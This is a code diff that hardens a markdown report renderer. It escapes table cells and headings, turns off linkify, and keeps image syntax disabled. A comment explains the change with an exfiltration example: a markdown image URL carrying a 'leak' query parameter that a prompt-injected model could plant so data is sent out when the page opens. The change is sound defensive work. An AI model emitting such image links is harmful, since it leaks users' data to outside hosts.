@@ -9,13 +9,15 @@ on surprises, amber "on purpose" badges on absences.
 import html as _html
 import os
 
+from crawl.core.render import md_cell, md_heading
+
 from markdown_it import MarkdownIt
 
 # coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
 # live <img> that fires on page open, an egress channel from repo text via
 # a prompt-injected model. html=False does not cover it.
 _MD = MarkdownIt(
-    "commonmark", {"html": False, "linkify": True, "breaks": False}
+    "commonmark", {"html": False, "linkify": False, "breaks": False}
 ).enable(["table"]).disable("image")
 
 
@@ -521,21 +523,19 @@ def render_markdown(name, shared):
     for d in positioning["dimensions"]:
         parts.append(f"- **{d['name']}**: {d['definition']}")
     parts.append("")
-    headers = ["Product"] + [d["name"] for d in positioning["dimensions"]]
+    headers = ["Product"] + [md_cell(d["name"]) for d in positioning["dimensions"]]
     parts.append("| " + " | ".join(headers) + " |")
     parts.append("| " + " | ".join(["---"] * len(headers)) + " |")
     for c in positioning["competitors"]:
-        cells = [f"**{c['name']}**"]
+        cells = [f"**{md_cell(c['name'])}**"]
         for cell in c.get("cells", []):
-            verdict = str(cell.get("verdict", "")).replace("\n", " ")
-            detail = str(cell.get("detail", "")).replace("\n", " ")
-            cells.append(f"**{verdict}**. {detail}")
+            cells.append(f"**{md_cell(cell.get('verdict', ''))}**. {md_cell(cell.get('detail', ''))}")
         parts.append("| " + " | ".join(cells) + " |")
     parts.append("")
 
     parts.append("## Hiding in the code\n")
     for p in surprises["present"]:
-        parts.append(f"### {p['headline']}")
+        parts.append(f"### {md_heading(p['headline'])}")
         parts.append(f"_{p['where']}_")
         parts.append("")
         parts.append(p["bet"])
@@ -543,7 +543,7 @@ def render_markdown(name, shared):
 
     parts.append("## Missing on purpose\n")
     for a in surprises["absent"]:
-        parts.append(f"### {a['headline']}")
+        parts.append(f"### {md_heading(a['headline'])}")
         parts.append(f"_{a['evidence']}_")
         parts.append("")
         parts.append(a["tradeoff"])
